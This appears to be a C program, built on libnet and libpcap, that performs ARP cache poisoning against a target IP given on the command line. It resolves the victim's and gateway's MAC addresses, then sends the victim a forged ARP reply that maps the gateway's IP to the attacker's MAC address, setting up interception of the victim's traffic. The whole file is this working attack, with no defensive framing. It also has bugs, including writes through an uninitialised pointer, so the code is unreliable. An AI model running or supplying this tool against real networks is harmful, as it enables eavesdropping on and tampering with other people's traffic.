#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <stdint.h>
#include <pcap.h>

int main(int argc, char * argv[]) {
	if(argc !=2){
		printf("usage : %s [Target IP]\n",argv[0]);
		return -1;
	}

	system("python ./gateway.py");
	FILE * fp = fopen("./gateway","r");
	char gateway[30];
	fscanf(fp, "%s", &gateway);

	libnet_t *l;
	char errbuf[LIBNET_ERRBUF_SIZE];
	u_int32_t attacker_ip_addr, vimtim_ip_addr, gateway_ip_addr;
	struct libnet_ether_addr *attacker_mac_addr;
	struct libnet_ether_addr *vimtim_mac_addr;
	struct libnet_ether_addr gateway_mac_addr;
	struct libnet_ethernet_hdr * mac;
	char * Device;
	pcap_t * pPcap;
	int i;
	const u_char * pData;
        struct pcap_pkthdr h;
	u_int8_t mac_zero_addr[6] = {0x0,0x0,0x0,0x0,0x0,0x0};
	u_int8_t mac_broadcast_addr[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
	
	Device = pcap_lookupdev(errbuf);
        pPcap = pcap_open_live(Device, 1500, 1, 0, errbuf);
 	l = libnet_init(LIBNET_LINK, Device, errbuf);

 	if ( l == NULL ) {
   		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
   		exit(EXIT_FAILURE);
 	}

	attacker_ip_addr = libnet_get_ipaddr4(l);
	attacker_mac_addr = libnet_get_hwaddr(l);
	
	
	printf("Attacker IP Addr : %s\n",libnet_addr2name4(attacker_ip_addr, LIBNET_DONT_RESOLVE));	
	printf("Attacker Mac Addr : %02x:%02x:%02x:%02x:%02x:%02x\n", 
		attacker_mac_addr->ether_addr_octet[0],
		attacker_mac_addr->ether_addr_octet[1],
		attacker_mac_addr->ether_addr_octet[2],
		attacker_mac_addr->ether_addr_octet[3],
		attacker_mac_addr->ether_addr_octet[4],
		attacker_mac_addr->ether_addr_octet[5]);
	
	vimtim_ip_addr = libnet_name2addr4(l,argv[1],LIBNET_DONT_RESOLVE);
	printf("Vimtim IP Addr : %s\n",libnet_addr2name4(vimtim_ip_addr,LIBNET_DONT_RESOLVE));
	
	libnet_autobuild_arp(ARPOP_REQUEST, attacker_mac_addr->ether_addr_octet, 
	(u_int8_t*)(&attacker_ip_addr), mac_zero_addr, 
	(u_int8_t*)(&vimtim_ip_addr),l);
	
	libnet_autobuild_ethernet(mac_broadcast_addr, ETHERTYPE_ARP, l);

	libnet_write(l);
	
	pData = pcap_next(pPcap, &h);
	pData = pcap_next(pPcap, &h);
	
	for(i=0;i<6;i++){
		vimtim_mac_addr->ether_addr_octet[i] = *(pData+i+6);
	}

	printf("Vimtim Mac Addr : %02x:%02x:%02x:%02x:%02x:%02x\n",
                vimtim_mac_addr->ether_addr_octet[0],
                vimtim_mac_addr->ether_addr_octet[1],
                vimtim_mac_addr->ether_addr_octet[2],
                vimtim_mac_addr->ether_addr_octet[3],
                vimtim_mac_addr->ether_addr_octet[4],
                vimtim_mac_addr->ether_addr_octet[5]);
	
	gateway_ip_addr = libnet_name2addr4(l,gateway,LIBNET_DONT_RESOLVE);

	printf("Gateway IP Addr : %s\n",libnet_addr2name4(gateway_ip_addr,LIBNET_DONT_RESOLVE));	
	fclose(fp);

  	libnet_autobuild_arp(ARPOP_REQUEST, attacker_mac_addr->ether_addr_octet,
        (u_int8_t*)(&attacker_ip_addr), mac_zero_addr,
        (u_int8_t*)(&gateway_ip_addr),l);
	
	libnet_autobuild_ethernet(mac_broadcast_addr, ETHERTYPE_ARP, l);

	libnet_write(l);
	
	pData = pcap_next(pPcap, &h);
	pData = pcap_next(pPcap, &h);
	
	for(i=0;i<6;i++){
		gateway_mac_addr.ether_addr_octet[i]=*(pData+i+6);
	}

	printf("Gateway Mac Addr : %02x:%02x:%02x:%02x:%02x:%02x\n",
                gateway_mac_addr.ether_addr_octet[0],
                gateway_mac_addr.ether_addr_octet[1],
                gateway_mac_addr.ether_addr_octet[2],
                gateway_mac_addr.ether_addr_octet[3],
                gateway_mac_addr.ether_addr_octet[4],
                gateway_mac_addr.ether_addr_octet[5]);

	
	libnet_autobuild_arp(ARPOP_REPLY, attacker_mac_addr->ether_addr_octet,
        (u_int8_t*)(&gateway_ip_addr), vimtim_mac_addr->ether_addr_octet,
        (u_int8_t*)(&vimtim_ip_addr),l);

	libnet_autobuild_ethernet(vimtim_mac_addr, ETHERTYPE_ARP, l);

        libnet_write(l);
	
	libnet_destroy(l);
	return 0;
}

